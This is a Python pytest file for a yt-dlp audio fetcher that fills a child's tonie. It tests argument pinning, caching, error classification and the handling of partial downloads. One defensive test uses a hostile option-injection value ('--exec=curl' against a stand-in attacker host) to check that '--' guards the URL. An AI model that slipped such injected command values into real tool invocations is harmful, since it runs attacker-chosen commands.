import subprocess
from pathlib import Path
import pytest
from boxbutler.domain.models import Item, ItemKind
from boxbutler.domain.cache_name import cache_name
from boxbutler.fetch.ytdlp import YtDlpFetcher, ytdlp_args, classify_ytdlp_failure
from boxbutler.fetch.protocol import ExtractionBroken, ItemUnavailable

ITEM = Item("i1", "L", 0, ItemKind.YOUTUBE, "https://example.invalid/watch?v=QzuMO0t5JUI", "QzuMO0t5JUI", "Spaghetti 🍝")

def test_args_pin_format_140_and_node_runtime():
    a = ytdlp_args("u", "/c/%(title)s.%(ext)s")
    assert a[:5] == ["yt-dlp", "-f", "140", "--js-runtimes", "node"] and "--no-playlist" in a and "--no-overwrites" in a

def test_args_terminate_options_before_url():
    # Final review, Major 1 (defence in depth): even if a hostile,
    # option-looking value somehow reached the fetcher unvalidated, `--`
    # must sit immediately before it so it can never be read as an
    # option. Assert on the actual argv shape, not "no exception raised".
    hostile = "--exec=curl http://attacker.invalid/?p=youtu.be/aaaaaaaaaaa"
    a = ytdlp_args(hostile, "/c/%(title)s.%(ext)s")
    assert a[-2:] == ["--", hostile]

def test_cache_hit_skips_subprocess(tmp_path):
    hit = tmp_path / cache_name(ITEM.title, ITEM.source_key); hit.write_bytes(b"x")
    calls = []
    f = YtDlpFetcher(runner=lambda args, **kw: calls.append(args) or subprocess.CompletedProcess(args, 0, "", ""))
    assert f.fetch(ITEM, tmp_path) == hit and calls == []

def test_miss_runs_ytdlp_with_sanitised_template(tmp_path):
    def runner(args, **kw):
        Path(args[args.index("-o") + 1].replace("%(ext)s", "m4a")).write_bytes(b"aac")
        return subprocess.CompletedProcess(args, 0, "", "")
    out = YtDlpFetcher(runner=runner).fetch(ITEM, tmp_path)
    assert out.name == "Spaghetti [QzuMO0t5JUI].m4a" and out.exists()

@pytest.mark.parametrize("stderr,exc", [
    ("ERROR: [youtube] abc: Private video. Sign in if you've been granted access", ItemUnavailable),
    ("ERROR: [youtube] abc: Video unavailable", ItemUnavailable),
    ("ERROR: [youtube] abc: Requested format is not available", ExtractionBroken),
    ("ERROR: [youtube] abc: Sign in to confirm you're not a bot", ExtractionBroken),
    ("node: command not found", ExtractionBroken),
])
def test_failure_classification(stderr, exc):
    assert classify_ytdlp_failure(stderr) is exc

def test_nonzero_exit_raises_classified_error(tmp_path):
    f = YtDlpFetcher(runner=lambda a, **kw: subprocess.CompletedProcess(a, 1, "", "ERROR: Video unavailable"))
    with pytest.raises(ItemUnavailable):
        f.fetch(ITEM, tmp_path)

def test_success_without_file_is_extraction_broken(tmp_path):
    f = YtDlpFetcher(runner=lambda a, **kw: subprocess.CompletedProcess(a, 0, "", ""))
    with pytest.raises(ExtractionBroken):
        f.fetch(ITEM, tmp_path)

def test_partial_download_is_not_mistaken_for_a_completed_file(tmp_path):
    # yt-dlp writes a `.part` while a download is in progress. If a run is
    # killed mid-download and retried, a stray `.part` left in the cache
    # dir must never be treated as a cache hit or as the file the run just
    # produced -- that would put a truncated file on a child's tonie.
    (tmp_path / f"Spaghetti [{ITEM.source_key}].m4a.part").write_bytes(b"partial")

    def runner(args, **kw):
        Path(args[args.index("-o") + 1].replace("%(ext)s", "m4a")).write_bytes(b"aac")
        return subprocess.CompletedProcess(args, 0, "", "")

    out = YtDlpFetcher(runner=runner).fetch(ITEM, tmp_path)
    assert out.name == "Spaghetti [QzuMO0t5JUI].m4a" and out.read_bytes() == b"aac"
